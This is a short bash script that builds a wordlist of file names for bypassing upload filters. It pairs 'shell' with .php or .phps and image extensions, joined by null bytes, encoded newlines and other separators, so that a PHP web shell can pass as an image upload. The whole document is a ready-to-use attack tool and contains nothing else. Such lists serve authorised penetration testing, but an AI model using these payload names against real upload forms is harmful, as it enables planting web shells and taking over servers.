#!/usr/bin/bash

for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do

		# jpg
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt

		# jpeg
        echo "shell$char$ext.jpeg" >> wordlist.txt
        echo "shell$ext$char.jpeg" >> wordlist.txt
        echo "shell.jpeg$char$ext" >> wordlist.txt
        echo "shell.jpeg$ext$char" >> wordlist.txt

		# png
        echo "shell$char$ext.png" >> wordlist.txt
        echo "shell$ext$char.png" >> wordlist.txt
        echo "shell.png$char$ext" >> wordlist.txt
        echo "shell.png$ext$char" >> wordlist.txt
    done
done
